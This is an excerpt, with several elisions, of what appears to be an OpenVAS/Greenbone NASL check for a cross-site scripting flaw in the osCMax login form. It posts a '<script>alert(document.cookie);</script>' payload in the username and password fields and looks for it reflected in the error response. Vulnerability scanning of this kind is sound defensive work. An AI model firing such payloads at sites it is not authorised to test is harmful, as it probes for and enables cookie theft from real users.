...
if(description){
  ...
  the trust relationship between their browser and the server." );
	...
	script_dependencies( "gb_oscmax_detect.sc" );
...
postData = "username='<script>alert(document.cookie);</script>&password" + "='<script>alert(document.cookie);</script>";
sndReq = NASLString( "POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen( postData ), "\r\n\r\n", postData );
rcvRes = http_keepalive_send_recv( port: ePort, data: sndReq );
if(IsMatchRegexp( rcvRes, "HTTP/1\\.. 200" ) && ContainsString( rcvRes, "<script>alert(document.cookie);</script>" ) && ContainsString( rcvRes, "Wrong Username" ) && ContainsString( rcvRes, "error" )){
